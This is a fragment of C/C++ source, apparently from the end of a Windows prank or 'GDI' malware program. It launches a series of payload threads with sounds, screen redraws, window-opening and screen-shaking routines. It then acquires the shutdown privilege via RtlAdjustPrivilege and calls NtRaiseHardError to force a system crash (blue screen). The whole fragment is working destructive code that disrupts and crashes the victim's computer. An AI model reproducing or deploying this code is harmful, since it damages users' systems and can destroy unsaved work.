	RedrawWindow(0, 0, 0, 133);
	Sleep(100);
	HANDLE thread18 = CreateThread(0, 0, payload18, 0, 0, 0);
	sound18(11025, 30);
	TerminateThread(thread18, 0);
	CloseHandle(thread18);
	RedrawWindow(0, 0, 0, 133);
	Sleep(100);
	HANDLE thread19 = CreateThread(0, 0, payload19, 0, 0, 0);
	sound19(11025, 30);
	TerminateThread(thread19, 0);
	CloseHandle(thread19);
	RedrawWindow(0, 0, 0, 133);
	Sleep(100);
	HANDLE thread20 = CreateThread(0, 0, payload20, 0, 0, 0);
	CreateThread(0, 0, opener, 0, 0, 0);
	CreateThread(0, 0, shaking, 0, 0, 0);
	sound20(48000, 30);
	TerminateThread(thread20, 0);
	CloseHandle(thread20);
	RedrawWindow(0, 0, 0, 133);
	Sleep(100);
	BOOLEAN bl;
	DWORD response;
	NRHEdef NtRaiseHardError = (NRHEdef)GetProcAddress(LoadLibraryW(L"ntdll"), "NtRaiseHardError");
	RAPdef RtlAdjustPrivilege = (RAPdef)GetProcAddress(LoadLibraryW(L"ntdll"), "RtlAdjustPrivilege");
	RtlAdjustPrivilege(19, 1, 0, &bl);
	NtRaiseHardError(STATUS_ASSERTION_FAILURE, 0, 0, 0, 6, &response);
	Sleep(-1);
}